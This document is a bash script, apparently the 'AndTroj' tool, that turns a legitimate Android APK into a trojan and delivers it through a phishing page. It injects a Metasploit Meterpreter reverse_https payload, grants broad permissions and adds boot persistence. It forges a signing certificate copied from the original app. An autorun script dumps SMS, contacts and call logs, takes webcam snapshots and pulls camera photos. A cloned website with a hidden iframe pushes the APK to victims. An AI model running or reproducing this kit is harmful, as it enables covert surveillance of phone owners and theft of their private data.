#!/bin/bash
VER='2.0'

# Color definitions
readonly GREEN="\033[32m"
readonly WHITE="\033[37m"
readonly RED="\033[31m"
readonly BLUE="\033[34m"
readonly YELLOW="\033[33m"
readonly CYAN="\033[36m"
readonly MAGENTA="\033[35m"
readonly RESET="\033[0m"

# Message display functions
error()
{
    echo -e "${RED}[-] Error: $1${RESET}" >&2
    exit 1
}

success()
{
    echo -e "${GREEN}[+] $1${RESET}"
}

warning()
{
    echo -e "${YELLOW}[!] $1${RESET}"
}

info()
{
    echo -e "${BLUE}[*] $1${RESET}"
}

# Initial variables
USERS=$(ls /home | head -1)
LAN=$(hostname -I | awk '{print $1}')
WAN=$(curl -s https://api.ipify.org)

# Display ASCII art logo
logo()
{
    reset
    clear
    echo -e  "${GREEN}                            --/osssssssssssso/--                    "
    echo -e  "${GREEN}                        -+sss+-+--os.yo:++/.o-/sss+-                "
    echo -e  "${GREEN}                     /sy+++-.h.-dd++m+om/s.h.hy/:+oys/              "
    echo -e  "${GREEN}                  .sy/// h/h-:d-y:/+-/+-+/-s/sodooh:///ys.          "
    echo -e  "${GREEN}                -ys-ss/:y:so-/osssso++++osssso+.oo+/s-:o.sy-        "
    echo -e  "${GREEN}              -ys:oossyo/+oyo/:-:.-:.:/.:/-.-:/syo/+/s+:oo:sy-      "
    echo -e  "${GREEN}             /d/:-soh/-+ho-.:::--:- .os: -:-.:-/::sy+:+ysso+:d/     "
    echo -e  "${GREEN}            sy-..+oo-+h:--:..hy+y/  :s+.  /y/sh..:/-:h+-oyss:.ys    "
    echo -e  "${WHITE}           ys :+oo/:d/   .m-yyyo/- - -:   .+oyhy-N.   /d::yosd.sy   "
    echo -e  "${WHITE}          oy.++++//d.  ::oNdyo:     .--.     :oyhN+-:  .d//s//y.ys  "
    echo -e  "${WHITE}         :m-y+++//d-   dyyy++::-. -.o.-+.- .-::/+hsyd   -d/so+++.m: "
    echo -e  "${WHITE}        -d/-/+++.m-  /.ohso- ://:///++++///://:  :odo.+  -m.syoo:/d-"
    echo -e  "${WHITE}        :m-+++y:y+   smyms-   -//+/-ohho-/+//-    omsmo   +y s+oy-m:"
    echo -e  "${WHITE}        sy:+++y-N-  -.dy+:...-- :: ./hh/. :: --...//hh.:  -N-o+/:-so"
    echo -e  "${WHITE}        yo-///s-m   odohd.-.--:/o.-+/::/+-.o/:--.--hd:ho   m-s+++-+y"
    echo -e  "${WHITE}        yo::/+o-m   -yNy/:  ...:+s.//:://.s+:...  :/yNs    m-h++++oy"
    echo -e  "${WHITE}        oy/hsss-N-  oo:oN-   .-o.:ss:--:ss:.o-.   -My-oo  -N-o+++.so"
    echo -e  "${WHITE}        :m :++y:y+   sNMy+: -+/:.--:////:--.:/+- -+hNNs   +y-o++o-m:"
    echo -e  "${WHITE}        -d/::+o+.m-  -:/+ho:.       -//-       ./sdo::-  -m-o++++/d-"
    echo -e  "${WHITE}         :m-yo++//d- -ommMo//        -:        +oyNhmo- -d//s+++-m: "
    echo -e  "${WHITE}          oy /o++//d.  -::/oMss-   -+++s     :yNy+/:   .d//y+---ys  "
    echo -e  "${WHITE}           ys--+o++:d/ -/sdmNysNs+/./-//-//hNyyNmmy+- /d-+y--::sy   "
    echo -e    "${RED}            sy:..ooo-+h/--.-//odm/hNh--yNh+Ndo//-./:/h+-so+:+/ys    "
    echo -e    "${RED}             /d-o.ssy+-+yo:/:/:-:+sho..ohs/-:://::oh+.h//syo-d/     "
    echo -e    "${RED}              -ys-oosyss:/oyy//::..-.--.--:/.//syo+-ys//o/.sy-      "
    echo -e    "${RED}                -ys.sooh+d-s:+osssysssosssssso:/+/h:/yy/.sy-        "
    echo -e    "${RED}                  .sy/:os.h--d/o+-/+:o:/+.+o:d-y+h-o+-+ys.          "
    echo -e    "${RED}                     :sy+:+ s//sy-y.-h-m/om:s-y.++/+ys/             "
    echo -e    "${RED}                        -+sss+/o/ s--y.s+/:++-+sss+-                "
    echo -e    "${RED}                            --/osssssssssssso/--                    "
    echo -e   "${BLUE}                                  Unk9vvN                           "
    echo -e "${YELLOW}                           https://unk9vvn.com                      "
    echo -e   "${CYAN}                               AndTroj "$VER"                       "
    echo -e "\n"
}

# Display help menu
help()
{
    logo
    echo -e "$GREEN 🟢 $WHITE-a <apk>           $CYAN→$WHITE 🔍 Original APK for Trojanize"
    echo -e "$GREEN 📂 $WHITE-d <url>           $CYAN→$WHITE 📜 Original URL for Phishing"
    echo -e "$GREEN 🆘 $WHITE-h                 $CYAN→$WHITE 📖 Show this Help Menu"
    echo -e "$MAGENTA 📌 Example Usage:"
    echo -e "$WHITE    💻 sudo atj -a original.apk -d domain.com"  
}

# Check domain protocols (HTTP/HTTPS)
protocol()
{
    local domain="$1"
    local protocol="https"  # Default protocol

    # Check port 80
    if timeout 5 bash -c ">/dev/tcp/$domain/80" 2>/dev/null; then
        # Check port 443
        if ! timeout 5 bash -c ">/dev/tcp/$domain/443" 2>/dev/null; then
            domain="http"
        fi
    else
        # Check port 443
        if ! timeout 5 bash -c ">/dev/tcp/$domain/443" 2>/dev/null; then
            display_error "Both ports 80 and 443 are closed"
        fi
    fi

    echo "$domain"
}

# Join Nums
join_by()
{
    local delimiter="$1"
    shift
    printf %s "$1" "${@/#/$delimiter}"
}

# Bind Original and Payload
binder()
{
    APK="$1"
    OUTPUT=$(basename "$APK" .apk)
    ORGAPK="/tmp/original"
    PAYLOAD="/tmp/payload"

    for i in $(seq 1 7); do
        a[$i]=`cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 20; echo;`
    done

    rand=(${a[@]})
    rand_dir=${rand[1]}
    rand_mainbrad=${rand[2]}
    rand_payload=${rand[3]}
    rand_mainservice=${rand[4]}

    # Generate payload APK using msfvenom
    msfvenom --platform android -a dalvik -p android/meterpreter/reverse_https LHOST="$WAN" LPORT=443 -o /tmp/payload.apk
    apktool d -f /tmp/payload.apk -o "$PAYLOAD"
    rm -f /tmp/payload.apk

    # Decode the original APK
    apktool d -f "$APK" -o "$ORGAPK"
    mkdir -p "$ORGAPK/smali/com"

    # Extract SDK_VERSION from file
    info "Change Android API Version"
    manifest="${ORGAPK}/AndroidManifest.xml"
    sdk_version=$(grep -o 'package="[^"]*"' $manifest | cut -d'"' -f2)

    # Replace the line in the AndroidManifest.xml file
    sed -i 's|<manifest xmlns:android="http://schemas.android.com/apk/res/android"[^>]*>|<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="'$sdk_version'" platformBuildVersionCode="31" platformBuildVersionName="12">|' $manifest

    # Set Permissions
    info "Set All Permissions"
    permissions=(
       INTERNET ACCESS_WIFI_STATE CHANGE_WIFI_STATE ACCESS_NETWORK_STATE 
       ACCESS_COARSE_LOCATION ACCESS_FINE_LOCATION READ_PHONE_STATE 
       SEND_SMS RECEIVE_SMS RECORD_AUDIO CALL_PHONE READ_CONTACTS 
       WRITE_CONTACTS WRITE_SETTINGS CAMERA READ_SMS WRITE_EXTERNAL_STORAGE 
       RECEIVE_BOOT_COMPLETED SET_WALLPAPER READ_CALL_LOG WRITE_CALL_LOG WAKE_LOCK
    )

    # Extract existing permissions list
    existing_permissions=$(grep -o 'android:name="android\.permission\.[^"]*"' "$manifest" | cut -d'"' -f2 | cut -d'.' -f3)

    # Find last uses-permission line to add after it
    last_permission_line=$(grep -n '<uses-permission' "$manifest" | tail -1 | cut -d':' -f1)

    # Add new permissions
    for permission in "${permissions[@]}"; do
       if ! echo "$existing_permissions" | grep -q "^$permission$"; then
           sed -i "${last_permission_line}a\\    <uses-permission android:name=\"android.permission.$permission\"/>" "$manifest"
           ((last_permission_line++))
       fi
    done

    # Hooking Launchers
    info "Hooking Launchers"
    manifest_file="AndroidManifest.xml"

    # Check if the manifest file exists
    if [ ! -f "$manifest_file" ]; then
        error "Error: AndroidManifest.xml not found."
    fi

    # Find all line numbers containing LAUNCHER category
    launcher_lines=$(grep -n 'android.intent.category.LAUNCHER' "$manifest_file" | cut -d: -f1)

    if [ -z "$launcher_lines" ]; then
        error "Error: No LAUNCHER activity found."
    fi

    # Process each found launcher line
    while read -r launcher_line; do
        # Look upward (max 10 lines) for the <activity> tag
        for offset in {1..10}; do
            activity_line_num=$((launcher_line - offset))
            activity_line=$(sed -n "${activity_line_num}p" "$manifest_file")

            if [[ "$activity_line" == *"<activity"* ]]; then
                # Extract android:name attribute value
                activity_name=$(echo "$activity_line" | grep -oP 'android:name="\K[^"]+')

                if [ -n "$activity_name" ]; then
                    info "Launcher Activity: $activity_name"

                    # Convert dots to slashes to create smali path
                    smali_path=$(echo "$activity_name" | sed 's/\./\//g').smali

                    # Extract class name (last part after last dot), lowercase it for variable name
                    class_name=$(basename "$activity_name")
                    var_name=$(echo "$class_name" | tr '[:upper:]' '[:lower:]')

                    # Build final path and assign to variable
                    full_path="$ORGAPK/smali/$smali_path"
                    declare "$var_name=$full_path"

                    # Print the result
                    info "$var_name=\"$full_path\""
                    break
                fi
            fi
        done
    done <<< "$launcher_lines"

    if [ -z "$launcher_smali" ]; then
        error "Could not find the smali directory for the launcher. Exiting."
    fi

    # Construct CUSTOM_FOLDER
    custom_folder="$rand_dir"
    if [ "$custom_folder" = "." ]; then
        custom_folder="" # If the launcher is in the root of smali (e.g., LMainActivity.smali), CUSTOM_FOLDER should be empty
    else
        custom_folder="$custom_folder/"
    fi

    # Ensure the custom folder exists
    mkdir -p "$ORGAPK/$launcher_smali/$custom_folder"
    
    sed -i "s#</application>#    <receiver android:label=\"$rand_mainbrad\" android:name=\"${launcher_smali%.*}.$rand_mainbrad\">\\n            <intent-filter>\\n                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\\n            </intent-filter>\\n        </receiver>\\n        <service android:exported=\"true\" android:name=\"${launcher_smali%.*}.$rand_mainbrad\"/>\\n    </application>#g" "${ORGAPK}/AndroidManifest.xml"

    # Set correct launcher_smali, custom_folder, and rand_dir
    launcher_smali="smali"  # Assume always 'smali'; otherwise, extract dynamically
    custom_folder="$rand_dir"  # If a specific custom_folder is needed, set here

    # Ensure the destination directory exists
    mkdir -p "$ORGAPK/$launcher_smali/$custom_folder"

    # Check if payload directory exists before cd
    if [ ! -d "$PAYLOAD/smali/com/metasploit/stage/" ]; then
        error "Payload smali directory not found: $PAYLOAD/smali/com/metasploit/stage/"
    fi
    cd "$PAYLOAD/smali/com/metasploit/stage/" || error "Cannot cd to $PAYLOAD/smali/com/metasploit/stage/"

    # Copy smali files with random names
    cp MainActivity.smali a.smali b.smali c.smali e.smali f.smali "$ORGAPK/$launcher_smali/$custom_folder/" || error "Copy smali files failed"
    cp -r Payload.smali "$ORGAPK/$launcher_smali/$custom_folder/$rand_payload.smali" || error "Copy Payload.smali failed"
    cp -r MainService.smali "$ORGAPK/$launcher_smali/$custom_folder/$rand_mainservice.smali" || error "Copy MainService.smali failed"
    cp -r MainBroadcastReceiver.smali "$ORGAPK/$launcher_smali/$custom_folder/$rand_mainbrad.smali" || error "Copy MainBroadcastReceiver.smali failed"

    # Replace names in copied smali files
    sed -i "s#metasploit/stage#$custom_folder#g" "$ORGAPK/$launcher_smali/$custom_folder/"* || error "sed metasploit/stage failed"
    sed -i "s#payload#$rand_payload#g" "$ORGAPK/$launcher_smali/$custom_folder/"* || error "sed payload failed"
    sed -i "s#MainService#$rand_mainservice#g" "$ORGAPK/$launcher_smali/$custom_folder/"* || error "sed MainService failed"
    sed -i "s#MainBroadcastReceiver#$rand_mainbrad#g" "$ORGAPK/$launcher_smali/$custom_folder/"* || error "sed MainBroadcastReceiver failed"
    
    # Ensure script_dir is set
    if [ -z "$script_dir" ]; then
        script_dir="$(pwd)"
    fi
    cd "$script_dir"

    # Second way to inject Launcher
    backup=`cat $ORGAPK/AndroidManifest.xml | grep android:allowBackup | sed -r 's/.*android:name="([^"]*)".*/\1/'`
    backup_path=`echo ${backup%.*}`
    backup_path=`echo ${backup_path//.//}`

    # Get SMALI path
    smali_folders=(`ls $ORGAPK | grep smali`)
    for backup_smali in ${smali_folders[@]}; do
        if [ -f "$ORGAPK/$backup_smali/${backup//.//}.smali" ]; then
            break
        fi
    done

    if [ ! -d "$ORGAPK/$backup_smali/$backup_path" ]; then
        echo "in if: $ORGAPK/$backup_smali/$backup_path"
        if [ -z "$launcher_path_dots" ]; then
            error "launcher_path_dots is not set!"
        fi
        sed -i "/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \\n\\ \ \ \ \ invoke-static \{p\}, Lcom/$rand_payload/$rand_payload/$rand_mainservice;->start(Landroid\/content\/Context;)V" "$ORGAPK/$launcher_smali/${launcher_path_dots}.smali"
    else
        echo "in else"
        launcher_starter_num=`awk '/put-object/{ print NR }'  "$ORGAPK/$backup_smali/${backup//.//}.smali" | head -1`
        sed -i "$launcher_starter_num a \\ \ \ \ \ invoke-static\\ {v0},\\ Lcom/$custom_folder/$rand_mainservice;->start()V" "$ORGAPK/$backup_smali/${backup//.//}.smali"
    fi
    
    cat > /tmp/persis.sh << EOF
#!/bin/bash
while true
do am start --user 0 -a android.intent.action.MAIN -n ${launcher_smali%.*}.MainActivity
sleep 600
done
EOF
    echo -e "$GREEN [*]$YELLOW Generate Persistent$WHITE"
    cat > /tmp/autoand.rc << EOF
upload /tmp/persis.sh
execute -f \"sh persis.sh\"
sysinfo
check_root
getwd
route
geolocate
screenshot
dump_calllog
dump_sms
dump_contacts
webcam_snap
cd ../../../../../
cd /sdcard/DCIM/Camera
download -r *
EOF
    echo -e "$GREEN [*]$YELLOW Rebinding $OUTPUT $WHITE"
    apktool b $ORGAPK > /dev/null

    echo -e "$GREEN [*]$YELLOW Forged Signatures$WHITE"
    
    # Get certificate details efficiently
    CERT_OUTPUT=$(keytool -J-Duser.language=en -printcert -jarfile "$APK")
    
    CERT_OWNER=$(echo "$CERT_OUTPUT" | awk -F': ' '/Owner: / {print $2}')
    CERT_VALID_FROM=$(echo "$CERT_OUTPUT" | awk -F': ' '/Valid from: / {print $2}')
    CERT_VALID_UNTIL=$(echo "$CERT_OUTPUT" | awk -F'until: ' '/until: / {print $2}')
    
    # Extract individual fields from Owner
    CERT_COUNTRY=$(echo "$CERT_OWNER" | sed -n 's/.*C=\([^,]*\).*/\1/p')
    CERT_LOCALITY=$(echo "$CERT_OWNER" | sed -n 's/.*L=\([^,]*\).*/\1/p')
    CERT_ORGAN=$(echo "$CERT_OWNER" | sed -n 's/.*O=\([^,]*\).*/\1/p')
    CERT_ORGAN_UNIT=$(echo "$CERT_OWNER" | sed -n 's/.*OU=\([^,]*\).*/\1/p')
    CERT_COMMON_NAME=$(echo "$CERT_OWNER" | sed -n 's/.*CN=\([^,]*\).*/\1/p')
    CERT_EMAIL=$(echo "$CERT_OWNER" | sed -n 's/.*EMAILADDRESS=\([^,]*\).*/\1/p')
    CERT_STATE=$(echo "$CERT_OWNER" | sed -n 's/.*ST=\([^,]*\).*/\1/p')

    CERT_SIG=$(echo "$CERT_OUTPUT" | awk -F': ' '/Signature algorithm name: / {print $2}' | cut -d ' ' -f 1)
    CERT_DIGEST=$(echo "$CERT_SIG" | sed 's/with.*//')
    
    # Extract key algorithm and size
    CERT_KEY_ALGO_LINE=$(echo "$CERT_OUTPUT" | awk -F': ' '/Subject Public Key Algorithm: / {print $2}')
    CERT_TYPE=$(echo "$CERT_KEY_ALGO_LINE" | sed -n 's/.*\([A-Za-z0-9]*\) key.*/\1/p')
    CERT_LENGTH=$(echo "$CERT_KEY_ALGO_LINE" | sed -n 's/.*\([0-9]*\)-bit.*/\1/p')
    
    if [ -f "/tmp/unk9vvn.keystore" ];then
        rm /tmp/unk9vvn.keystore
    fi

    DNAME_DATA=("CN=$CERT_COMMON_NAME" "OU=$CERT_ORGAN_UNIT" "O=$CERT_ORGAN" "L=$CERT_LOCALITY" "ST=$CERT_STATE" "C=$CERT_COUNTRY" "EMAILADDRESS=$CERT_EMAIL")
    DNAME=$(join_by "," "${DNAME_DATA[@]}")
    
    # Set validity to 10 years (3650 days) as EST/EDT parsing was problematic and not suitable for keytool
    VALIDITY_DAYS=3650
    
    keytool -genkey -alias signing.key -keystore /tmp/unk9vvn.keystore -storepass 12341234 -keypass 12341234 -keyalg "$CERT_TYPE" -keysize "$CERT_LENGTH" -validity "$VALIDITY_DAYS" -dname "$DNAME" > /dev/null

    mv "$ORGAPK/dist/$OUTPUT.apk" "$script_dir/$OUTPUT-b.apk"
    jarsigner -verbose -sigalg "$CERT_SIG" -digestalg "$CERT_DIGEST" -keystore /tmp/unk9vvn.keystore "$OUTPUT-b.apk" signing.key -storepass 12341234 > /dev/null
    logo


    msfconsole -qx "use multi/handler;set PAYLOAD android/meterpreter/reverse_https; \
                    set LHOST $NoIP;set LPORT 443;set ReverseListenerBindAddress $LAN; \
                    set AutoRunScript /tmp/autoand.rc;set AndroidWakelock true;exploit -j"
}

# Phishing web page
phishing()
{
    # start webserver
    service apache2 start;service postgresql start

    # start ngrok
    echo -e "${GREEN}[*] Starting Ngrok...${NC}"
    ngrok http 80 >/dev/null 2>&1 &

    # Wait for ngrok to start and get the public URL
    NGROK_TIMEOUT=30
    NGROK_START_TIME=$(date +%s)
    NGHOST=""
    while [[ -z "$NGHOST" && ($(date +%s) - $NGROK_START_TIME) -lt $NGROK_TIMEOUT ]]; do
        NGHOST=$(curl -s "$NGROK_API_URL" | jq -r '.tunnels[0].public_url' | sed 's|https://||' 2>/dev/null)
        sleep 1
    done

    if [ -z "$NGHOST" ]; then
        echo -e "${RED}[X] Failed to get ngrok public URL after $NGROK_TIMEOUT seconds. Exiting.${NC}"
        exit 1
    fi

    mv "$OUTPUT-b.apk" /var/www/html/
    wget -O /var/www/html/index.html -c -k -q -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "$URL"

    # inject iframe apk
    INJECT_HTML="<iframe id='frame' src='$OUTPUT-b.apk' application='yes' width=0 height=0 style='display:none;' frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n<script type='text/javascript'>setTimeout(function(){window.location.href='$URL';}, 15000);</script>"
    sed -i "s|</body>|${INJECT_HTML}\n</body>|g" /var/www/html/index.html
    printf "$GREEN"  "[*] Send Phishing Link to TARGET: $NGHOST"
}

# Initialize
init()
{
    # Kill existing processes safely
    pkill -f "ngrok|ruby"

    # Start PostgreSQL service
    service postgresql start

    # Check if msfdb is already initialized
    DB_STATUS=$(msfconsole -qx "db_status;exit" 2>/dev/null)

    if [[ "$DB_STATUS" == *"connected to the database"* ]]; then
        echo "[+] Metasploit DB is already initialized."
    else
        echo "[*] Initializing Metasploit database..."
        msfdb init
    fi

    # Start msfdb service
    msfdb start

    # Configure DNS with error handling
    if ! grep -q "nameserver 178.22.122.100" /etc/resolv.conf 2>/dev/null; then
        if [ -w /etc/resolv.conf ]; then
            echo -e "nameserver 178.22.122.100\nnameserver 185.51.200.2" > /etc/resolv.conf
            chattr +i /etc/resolv.conf 2>/dev/null || true
        else
            warning "Cannot write to /etc/resolv.conf"
        fi
    fi

    # Initialize apt with error handling
    if [ ! -f "/etc/apt/trusted.gpg.d/kali-archive-key.asc" ]; then
        if wget -q https://archive.kali.org/archive-key.asc -O /etc/apt/trusted.gpg.d/kali-archive-key.asc; then
            apt update || warning "Failed to update apt"
        else
            warning "Failed to download Kali archive key"
        fi
    fi

    # Install dependencies with better error handling
    local -a apt=(
        "wget" "curl" "git" "jq" "unzip" "apt-transport-https" "locate" "default-jdk"
        "net-tools" "apktool" "metasploit-framework" "zipalign" "aapt" "apksigner"
    )

    # Check and install missing dependencies with improved checking
    local -a missing=()
    for dep in "${apt[@]}"; do
        if ! dpkg-query -W -f='${Status}' "$dep" 2>/dev/null | grep -q "installed"; then
            if ! command -v "$dep" &>/dev/null; then
                missing+=("$dep")
            fi
        fi
    done

    if (( ${#missing[@]} > 0 )); then
        info "Installing missing packages: ${missing[*]}"
        if ! apt install -qy "${missing[@]}"; then
            warning "Failed to install some packages"
        fi
    fi

    # install ngrok
    if [ ! -f "/usr/local/bin/ngrok" ]; then
        local name="ngrok"
        wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O /tmp/$name.tgz
        tar -xvzf /tmp/$name.tgz -C /usr/local/bin;rm -f /tmp/$name.tgz
        chmod +x /usr/local/bin/ngrok
        success "Successfully Installed $name"
    fi

    # install atj
    if [ ! -d "/usr/share/andtroj" ]; then
        local name="andtroj"
        git clone https://github.com/a9v8i/AndTroj /usr/share/$name
        chmod 755 /usr/share/$name/*
        cat > /usr/bin/$name << EOF
#!/bin/bash
cd /usr/share/$name;sudo ./atj.sh "\$@"
EOF
        chmod +x /usr/bin/$name
        success "Successfully Installed $name"
    elif [ "$(curl -s https://raw.githubusercontent.com/a9v8i/AndTroj/main/version)" != "$VER" ]; then
        local name="andtroj"
        cd /usr/share/$tool_name && git reset --hard && git clean -fd && git pull
        chmod 755 /usr/share/$name/*
        cat > /usr/bin/$name << EOF
#!/bin/bash
cd /usr/share/$name;sudo ./atj.sh "\$@"
EOF
        chmod +x /usr/bin/$name
        success "Successfully Updating $name"
        bash /usr/share/$name/atj.sh
    fi
}

# Main execution
main()
{
    # Show help if no arguments
    if [ $# -eq 0 ]; then
        help
        exit 0
    fi

    init # Initialize once at the beginning

    # Initialize variables
    APK=""
    URL=""

    # Parse command line arguments
    while getopts ":a:d:h" opt; do
        case "${opt}" in
            a)
                APK="${OPTARG}"
                ;;
            d)
                URL="${OPTARG}"
                ;;
            h|*)
                help
                exit 0
                ;;
        esac
    done

    # If both APK and URL are provided, proceed with the main logic
    if [[ -n "$APK" && -n "$URL" ]]; then
        binder "$APK"
        phishing "$URL"
    else
        error "Please provide both APK (-a) and URL (-d) arguments!"
        info "Usage: sudo $0 -a APK -d URL"
        exit 1
    fi
}

# Execute main with all arguments
main "$@"
